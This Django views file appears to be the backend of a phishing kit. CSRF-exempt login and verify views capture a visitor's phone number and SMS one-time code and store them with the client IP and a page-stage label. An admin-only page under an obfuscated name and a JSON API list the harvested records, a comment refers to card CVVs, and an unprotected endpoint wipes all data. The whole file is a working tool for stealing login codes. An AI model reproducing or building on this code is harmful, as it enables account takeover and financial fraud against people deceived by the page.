from django.shortcuts import render, redirect
from django.db import models
from .models import ContactModel
import requests
from django.http import HttpResponse
import re
from django.views.decorators.csrf import csrf_exempt

import json
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse
from django.urls import reverse_lazy
from django.contrib.auth.decorators import user_passes_test
import time
import random
from django.contrib.sessions.models import Session
from django.utils import timezone
from django.core.exceptions import ObjectDoesNotExist
from django.http import HttpResponse
from .models import IPAddress
import socket
from django.http import HttpResponseRedirect
from django.urls import reverse
from django.views.decorators.csrf import ensure_csrf_cookie

# Create your views here.



def index(request):
    return render(request, "index.html")

def login(request):
    return render(request, "login/index.html")


@csrf_exempt
def login(request):
    if request.method == "POST":
        request.POST
        number = request.POST.get('phone')
        print(number)  
        clean_number = re.sub(r'\D', '', number)
        client_ip = get_client_ip(request)
        contact = ContactModel(ip=client_ip, phone=clean_number)
        contact.page_name="Nomre"
        contact.save()
        input_string = str(clean_number)
        number1 = int(input_string[:2])
        number2 = int(input_string[2:5])
        number3 = int(input_string[5:7])
        number4 = int(input_string[7:])
        context={
            "number1":number1,
            "number2":number2,
            "number3":number3,
            "number4":number4
        }
        request.session['contact_id'] = contact.id
        return render(request, 'login/otp.html',context)
    return render(request, 'login/index.html')


@csrf_exempt
def verify(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    input_string = str(contact.phone)
    number1 = int(input_string[:2])
    number2 = int(input_string[2:5])
    number3 = int(input_string[5:7])
    number4 = int(input_string[7:])
    context={
            "number1":number1,
            "number2":number2,
            "number3":number3,
            "number4":number4
        }
    if request.method == "POST":
        phone1 = request.POST.get("phone1")
        phone2 = request.POST.get("phone2")
        phone3 = request.POST.get("phone3")
        phone4 = request.POST.get("phone4")
        combined_sms = ""
        if phone1 is not None:
            combined_sms += phone1
        if phone2 is not None:
            combined_sms += phone2
        if phone3 is not None:
            combined_sms += phone3
        if phone4 is not None:
            combined_sms += phone4
        contact.sms=combined_sms
        contact.page_name="Loading"
        contact.save()
        return render( request,'pages/loading.html' )
    return render( request,'login/index.html',context )


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def delete_all_contacts(request):
    ContactModel.objects.all().delete()
    return JsonResponse({'status': 'success'})




def is_admin(user):
    return user.is_superuser

@user_passes_test(is_admin)
def contact_list_api(request):
    contacts = ContactModel.objects.order_by('-id').values()  # Only return contacts with non-null value for cvv
    return JsonResponse({'contacts': list(contacts)})


@user_passes_test(is_admin)
def Asdsad32da(request):
    contacts = ContactModel.objects.all()
    return render(request, 'Asdsad32da.html', {'contacts': contacts})